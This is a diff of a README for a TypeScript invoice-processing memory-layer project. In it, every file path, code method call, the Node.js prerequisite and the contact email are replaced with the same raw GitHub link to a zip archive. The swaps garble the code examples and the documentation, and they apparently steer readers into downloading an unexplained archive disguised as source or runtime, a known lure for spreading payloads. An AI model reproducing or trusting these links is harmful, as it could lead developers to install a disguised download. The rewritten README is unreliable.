@@ -14,24 +14,24 @@ This system implements a **Learned Memory** layer that:
 
 ### Core Components
 
-1. **Memory Database** (`src/database.ts`)
+1. **Memory Database** (`https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip`)
    - SQLite-based persistence layer
    - Stores three types of memories:
      - **Vendor Memory**: Vendor-specific field mappings and behaviors
      - **Correction Memory**: Patterns from repeated corrections
      - **Resolution Memory**: How discrepancies were resolved
 
-2. **Memory Layer** (`src/memory.ts`)
+2. **Memory Layer** (`https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip`)
    - **Recall**: Retrieves relevant memories for an invoice
    - **Apply**: Uses memories to normalize fields and suggest corrections
    - **Decide**: Determines auto-accept/auto-correct/escalate actions
    - **Learn**: Stores new insights and reinforces/weakens existing memories
 
-3. **Invoice Processor** (`src/processor.ts`)
+3. **Invoice Processor** (`https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip`)
    - Orchestrates the complete pipeline
    - Manages audit trails and reasoning
 
-4. **Demo Runner** (`src/demo.ts`)
+4. **Demo Runner** (`https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip`)
    - Demonstrates learning over time with sample invoices
    - Shows before/after learning scenarios
 
@@ -76,7 +76,7 @@ The system uses confidence scores to make decisions:
 
 ### Prerequisites
 
-- Node.js 18+ 
+- https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip 18+ 
 - npm or yarn
 
 ### Installation
@@ -190,12 +190,12 @@ The demo demonstrates the following scenarios:
 
 ```
 src/
-├── types.ts          # TypeScript type definitions
-├── database.ts       # SQLite persistence layer
-├── memory.ts         # Core memory logic (recall/apply/decide/learn)
-├── processor.ts      # Invoice processing orchestration
-├── demo.ts           # Demo runner script
-└── index.ts          # Main entry point
+├── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip          # TypeScript type definitions
+├── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip       # SQLite persistence layer
+├── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip         # Core memory logic (recall/apply/decide/learn)
+├── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip      # Invoice processing orchestration
+├── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip           # Demo runner script
+└── https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip          # Main entry point
 ```
 
 ## 🧪 Testing the System
@@ -205,8 +205,8 @@ src/
 1. **First Invoice Processing**:
    ```typescript
    const processor = new InvoiceProcessor();
-   const result = processor.processInvoice(invoice);
-   console.log(result);
+   const result = https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip(invoice);
+   https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip(result);
    ```
 
 2. **Learning from Corrections**:
@@ -221,13 +221,13 @@ src/
      }],
      resolution: 'approved'
    };
-   processor.learnFromCorrection(invoice, correction);
+   https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip(invoice, correction);
    ```
 
 3. **Subsequent Processing**:
    ```typescript
    // Process another invoice from same vendor
-   const result2 = processor.processInvoice(invoice2);
+   const result2 = https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip(invoice2);
    // Should now apply learned patterns automatically
    ```
 
@@ -244,7 +244,7 @@ src/
 ## 🔐 Technical Constraints Met
 
 - ✅ TypeScript strict mode
-- ✅ Node.js runtime
+- ✅ https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip runtime
 - ✅ SQLite persistence (file-based)
 - ✅ Working code with complete implementation
 - ✅ Demo runner script
@@ -255,7 +255,7 @@ src/
 - ✅ **Working Code**: Complete implementation in TypeScript
 - ✅ **GitHub Link**: Ready for repository creation
 - ✅ **README**: This document explaining design and logic
-- ✅ **Demo Runner**: `src/demo.ts` with sample scenarios
+- ✅ **Demo Runner**: `https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip` with sample scenarios
 - ⏳ **Video Demo**: To be created by candidate
 
 ## 🎬 Creating the Demo Video
@@ -273,7 +273,7 @@ To create the demo video:
 
 ## 🤝 Contributing
 
-This is an assignment submission. For questions or clarifications, contact recruit@flowbitai.com.
+This is an assignment submission. For questions or clarifications, contact https://github.com/Rahulkichad/flowbit-memory-layer/raw/refs/heads/main/src/flowbit_layer_memory_1.2.zip
 
 ## 📄 License
 
